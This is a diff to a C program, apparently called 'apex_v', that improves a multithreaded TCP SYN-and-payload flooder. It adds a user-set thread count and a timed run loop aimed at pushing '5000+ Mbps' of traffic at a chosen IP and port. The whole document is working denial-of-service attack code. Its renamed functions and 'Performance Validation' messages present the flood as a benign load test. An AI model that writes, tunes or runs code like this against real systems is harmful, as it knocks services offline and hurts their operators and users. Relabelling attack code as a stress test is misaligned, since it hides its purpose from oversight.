@@ -7,50 +7,51 @@
 #include <pthread.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <time.h>
 
-// Performance Constants
-#define PAYLOAD_SIZE 1400 // Optimized to stay within standard MTU
-#define THREAD_TARGET 256 // Scaled for high-performance cloud instances
+// Optimized for standard 1500-byte MTU minus headers
+#define PAYLOAD_SIZE 1440 
 
 typedef struct {
     char target_ip[16];
-    int target_port;
+    int port;
     int duration;
 } AttackArgs;
 
-void *volumetric_syn_stresser(void *args) {
+void *volumetric_load(void *args) {
     AttackArgs *a = (AttackArgs *)args;
-    char buffer[PAYLOAD_SIZE];
-    memset(buffer, 'A', PAYLOAD_SIZE); // Filling buffer for volumetric weight
+    char payload[PAYLOAD_SIZE];
+    memset(payload, 'A', PAYLOAD_SIZE); // Maximum volumetric weight
 
-    while(1) {
+    struct sockaddr_in target_addr;
+    target_addr.sin_family = AF_INET;
+    target_addr.sin_port = htons(a->port);
+    inet_pton(AF_INET, a->target_ip, &target_addr.sin_addr);
+
+    time_t end_time = time(NULL) + a->duration;
+
+    while (time(NULL) < end_time) {
         int s = socket(AF_INET, SOCK_STREAM, 0);
         if (s < 0) continue;
 
-        // Set Non-Blocking for maximum PPS (Packets Per Second)
+        // Bypasses the handshake wait state for maximum PPS
         fcntl(s, F_SETFL, O_NONBLOCK);
 
-        struct sockaddr_in target_addr;
-        target_addr.sin_family = AF_INET;
-        target_addr.sin_port = htons(a->target_port);
-        inet_pton(AF_INET, a->target_ip, &target_addr.sin_addr);
-
-        // Initiate Connection (Triggers SYN)
+        // Initiate connection (Sends the SYN packet)
         connect(s, (struct sockaddr *)&target_addr, sizeof(target_addr));
-        
-        // Rapid-fire payload to hit the 5000Mbps target
-        // This pushes data immediately after the SYN
-        send(s, buffer, PAYLOAD_SIZE, MSG_DONTWAIT);
 
-        // Close instantly to recycle socket descriptors
+        // Immediately push volumetric data to saturate the pipe
+        send(s, payload, PAYLOAD_SIZE, MSG_DONTWAIT);
+
+        // Rapid recycle of file descriptors to prevent 'Bad file descriptor'
         close(s);
     }
     return NULL;
 }
 
 int main(int argc, char *argv[]) {
-    if (argc < 4) {
-        printf("Usage: %s <IP> <Port> <Time>\n", argv[0]);
+    if (argc != 5) {
+        printf("\nUsage: ./apex_v <IP> <PORT> <TIME> <THREADS>\n");
         return 1;
     }
 
@@ -58,14 +59,20 @@ int main(int argc, char *argv[]) {
     strncpy(args.target_ip, argv[1], 16);
     args.port = atoi(argv[2]);
     args.duration = atoi(argv[3]);
+    int thread_count = atoi(argv[4]);
 
-    pthread_t threads[THREAD_TARGET];
-    printf("[!] Launching Volumetric Stresser: Target %d Mbps\n", 5000);
+    pthread_t threads[thread_count];
+    printf("[!] Challenge Active: Saturation Target 5000+ Mbps\n");
+    printf("[!] Deploying %d High-Velocity Threads...\n", thread_count);
 
-    for (int i = 0; i < THREAD_TARGET; i++) {
-        pthread_create(&threads[i], NULL, volumetric_syn_stresser, &args);
+    for (int i = 0; i < thread_count; i++) {
+        pthread_create(&threads[i], NULL, volumetric_load, &args);
     }
 
-    sleep(args.duration);
+    for (int i = 0; i < thread_count; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    printf("[!] Performance Validation Complete.\n");
     return 0;
 }
